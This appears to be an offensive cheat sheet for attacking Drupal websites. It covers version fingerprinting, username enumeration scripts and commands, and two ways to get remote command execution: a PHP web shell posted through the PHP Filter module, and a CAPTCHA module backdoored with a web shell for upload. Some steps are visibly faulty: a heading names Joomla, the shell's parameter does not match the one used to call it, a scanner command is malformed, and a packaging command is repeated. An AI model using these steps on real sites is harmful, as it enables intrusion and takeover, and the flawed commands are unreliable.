### **INTRODUCTION**

Drupal is a free and open-source content management system (CMS) used to build and manage websites. It's written in PHP and provides a backend framework for at least 2.3% of all websites worldwide, from personal blogs to corporate, political, and government sites.


### **IDENTIFYING JOOMLA VERSION**

1.  View the CHANGELOG.txt file to identify the Drupal version:  
    `http://[DRUPAL-DOMAIN]/CHANGELOG.txt`
2.  For Drupal 8 and above, the core/CHANGELOG.txt file can be used to determine the version:  
    `http://[DRUPAL-DOMAIN]/core/CHANGELOG.txt`
3.  The drupal.js file may contain version information:  
    `http://[DRUPAL-DOMAIN]/misc/drupal.js`
4.  Check the page source for meta tags indicating the Drupal version:  
    `<meta name="generator" content="Drupal 7 (http://drupal.org)" />`
5.  Droopescan is a scanner that can enumerate Drupal installations  
    `droopescan scan drupal -u http://[DRUPAL-DOMAIN]`
6.  Nmap, with the http-drupal-enum script, can be used to enumerate Drupal installations  
    `nmap -sV --script http-drupal-enum --script-args http-drupal-enum.basepath=/ http://[DRUPAL-DOMAIN]`

### **USER ENUMERATION TECHNIQUES**

1.  Analyze error messages to identify existing user accounts. Drupal redirects to user pages if the account exists:  
    `for i in {1..10}; do curl -s -o /dev/null -w "%{http_code}" http://[DRUPAL-DOMAIN]/user/$i; done`
    
2.  Measure response times for different user actions to infer the existence of user accounts:
    
    ```python
    import requests
    import time
    
    def measure_response_time(url, data):
        start_time = time.time()
        response = requests.post(url, data=data)
        end_time = time.time()
        return end_time - start_time
    
    user_exists = measure_response_time('http://[DRUPAL-URL]/login', {'username': 'existing_user', 'password': 'wrong_password'})
    user_not_found = measure_response_time('http://[DRUPAL-URL]/login', {'username': 'nonexistent_user', 'password': 'wrong_password'})
    print('Existing user:', user_exists, 'Nonexistent user:', user_not_found)
    ```
    
3.  Check for user-specific customization or redirections. If redirects to a login page for non-existent users and to a dashboard for existing users, this could be a potential vector for username enumeration.  
    `http://[DRUPAL-DOMAIN]/users/[USERNAME]`
    
4.  Droopescan can also be used to check for user enumeration  
    `drupal -u http://[DRUPAL-DOMAIN] --enumerate u`
    
5.  Investigate forums, articles, and comments on the target Drupal site. Users often leave traces or use similar usernames across different platforms.
    
6.  If the Drupal site has JSON API  you might be able to retrieve user information:  
    `curl -s http://[DRUPAL-DOMAIN]/jsonapi/user/user | jq`  
    Look for unique identifiers or username fields in the JSON response.
    

### **PHP CODE EXECUTION IN FILTER MODULE DRUPAL**

### **STEP 1. ENABLE THE PHP FILTER MODULE**

1.  Access the module administration panel by navigating to:  
    `http://[DRUPAL-DOMAIN]/#overlay=admin/modules`
2.  Locate and enable the PHP Filter module, then save the configuration.

### **STEP 2. CREATE A PAGE WITH PHP CODE**

1.  Navigate to the Content Creation Section:  
    `http://[DRUPAL-DOMAIN]/#overlay=node/add`
2.  Add a new Basic page, place the following PHP code to test command execution:  
    `<?php system($_GET['hackfast']); ?>`
3.  Ensure that the text format is set to "PHP code".
4.  Save the page. Note the URL of the newly created page, for example:  
    `http://[DRUPAL-DOMAIN]/node/1`

### **STEP 3: EXECUTE COMMANDS ON THE NEW PAGE**

1.  To run commands, add a query string with the command you wish to execute, such as:  
    `http://[DRUPAL-DOMAIN]/node/1?cmd=id`
2.  Or use curl to execute the command from the terminal:  
    `curl 'http://[DRUPAL-DOMAIN]/node/1?cmd=id'`

### **STEP 4: MODIFY AND UPLOAD A MODULE WITH A WEB SHELL**

1.  Download a module from Drupal.org, e.g., CAPTCHA:  
    `wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz`
    
2. Unzip the file:  
    `tar xvf captcha-8.x-1.2.tar.gz`
    
3. Add a PHP web shell into one of the PHP files:  
    `<?php system($_GET['cmd']); ?>`
    
4. Create a .htaccess file. This allows bypassing Drupal default access controls:
    
    ```
    <IfModule mod_rewrite.c>
      RewriteEngine On 
      RewriteBase /  
    </IfModule>
    ```
    
5. Place this file in the root directory of the modified module.
    
6. Repackage the modified module:  
    `tar cvf modified_captcha.tar.gz captcha/`
    
7. Upload the module through the Drupal admin interface.  
    `tar cvf modified_captcha.tar.gz captcha/`
    
8. Install the module.
    
9. Navigate to the web shell URL and add the command:  
    `http://[DRUPAL-DOMAIN]/modules/captcha/shell.php?cmd=id`
    
10. Or use curl to execute the command from the terminal:  
    `curl 'http://[DRUPAL-DOMAIN]/modules/captcha/shell.php?cmd=id'`